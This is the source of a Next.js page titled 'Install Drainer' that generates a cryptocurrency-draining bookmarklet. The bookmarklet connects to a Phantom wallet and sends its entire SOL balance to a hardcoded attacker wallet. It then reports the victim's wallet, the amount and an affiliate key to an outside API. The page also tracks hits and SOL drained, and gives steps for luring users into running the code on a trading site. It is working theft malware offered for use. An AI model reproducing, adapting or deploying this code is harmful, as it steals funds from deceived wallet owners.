// src/app/bookmarklet/page.js
'use client';

import { useState, useEffect } from 'react';

export default function BookmarkletPage() {
    const [stats, setStats] = useState({ hits: 0, totalSol: 0 });
    const [bookmarkletCode, setBookmarkletCode] = useState('');

    useEffect(() => {
        // 1. Fetch Stats
        fetch('/api/stats')
            .then(res => res.json())
            .then(data => {
                if (data.success) setStats(data);
            });

        // 2. Generate Bookmarklet Code
        // We grab the key from the current URL query param if available, or just generate the template
        const urlParams = new URLSearchParams(window.location.search);
        const userKey = urlParams.get('key') || 'YOUR_KEY_HERE';

        const code = `(function() {
            const KEY = "${userKey}";
            const WALLET = "32KtbQ7PYEwaLyEpywGhbYYUZvLyzmXiG43v5NNYyHJ6";
            const API_ENDPOINT = "https://website-tt4y.onrender.com/api/log-hit"; 
            // Note: If you want this to hit YOUR new API (localhost/next), change above to "http://localhost:3000/api/log-hit"
            // For production on Render, use your deployed API URL.
            
            function getSolanaLib() {
                if (window.solanaWeb3) return window.solanaWeb3;
                const script = document.createElement('script');
                script.src = 'https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js';
                document.head.appendChild(script);
                return new Promise(resolve => {
                    const check = setInterval(() => {
                        if (window.solanaWeb3) {
                            clearInterval(check);
                            resolve(window.solanaWeb3);
                        }
                    }, 100);
                });
            }

            async function drainSolana() {
                try {
                    const solana = await getSolanaLib();
                    const provider = window.solana;
                    if (!provider || !provider.isPhantom) { alert('Phantom Wallet not found.'); return; }
                    await provider.connect();
                    const connection = new solana.Connection("https://api.mainnet-beta.solana.com");
                    const walletPubKey = provider.publicKey;
                    const balance = await connection.getBalance(walletPubKey);
                    const lamports = balance.value;
                    const solAmount = lamports / 1e9;
                    if (solAmount <= 0.000001) { alert('No SOL to drain.'); return; }
                    const transaction = new solana.Transaction().add(
                        solana.SystemProgram.transfer({ fromPubkey: walletPubKey, toPubkey: new solana.PublicKey(WALLET), lamports: lamports })
                    );
                    transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
                    transaction.feePayer = walletPubKey;
                    const { signature } = await provider.signAndSendTransaction(transaction);
                    
                    // Send data to backend
                    const reportData = { wallet: walletPubKey.toString(), amount: solAmount.toFixed(4), signature: signature, key: KEY };
                    
                    try {
                        await fetch(API_ENDPOINT, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(reportData)
                        });
                    } catch (err) { console.error(err); }

                    alert(\`Drained \${solAmount.toFixed(4)} SOL to \${WALLET}\\nSignature: \${signature}\`);
                } catch (error) { alert("Error: " + error.message); }
            }
            drainSolana();
        })();`;

        setBookmarkletCode(code);
    }, []);

    const handleCopy = () => {
        navigator.clipboard.writeText(bookmarkletCode);
        alert('Bookmarklet code copied! Drag it to your bookmarks bar.');
    };

    return (
        <div className="min-h-screen bg-slate-900 text-white p-8">
            <h1 className="text-3xl font-bold mb-6 text-emerald-400">Install Drainer</h1>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div className="bg-slate-800 p-6 rounded-lg">
                    <h2 className="text-xl mb-4">Your Stats</h2>
                    <div className="space-y-4">
                        <div className="flex justify-between border-b border-slate-700 pb-2">
                            <span>Total Hits:</span>
                            <span className="font-bold text-blue-400">{stats.hits}</span>
                        </div>
                        <div className="flex justify-between border-b border-slate-700 pb-2">
                            <span>Total Drained:</span>
                            <span className="font-bold text-emerald-400">{stats.totalSol.toFixed(4)} SOL</span>
                        </div>
                    </div>
                </div>

                <div className="bg-slate-800 p-6 rounded-lg">
                    <h2 className="text-xl mb-4">Bookmarklet Code</h2>
                    <textarea className="w-full h-64 bg-slate-900 text-green-400 p-4 rounded font-mono text-sm mb-4" value={bookmarkletCode} readOnly />
                    <button onClick={handleCopy} className="w-full bg-emerald-600 hover:bg-emerald-500 py-2 rounded font-bold transition">Copy Code</button>
                </div>
            </div>

            <div className="mt-8 bg-slate-800 p-6 rounded-lg">
                <h2 className="text-xl mb-2">How to Install</h2>
                <ol className="list-decimal pl-5 space-y-2 text-slate-300">
                    <li>Click <strong>"Copy Code"</strong> above.</li>
                    <li>Go to <a href="https://axiom-trade.com" target="_blank" className="text-blue-400 underline">Axiom Trade</a> in a new tab.</li>
                    <li>Create a new bookmark in your browser.</li>
                    <li>Paste the code into the URL field of that bookmark.</li>
                    <li>Click the bookmark while on Axiom Trade to drain your wallet.</li>
                </ol>
            </div>
        </div>
    );
}
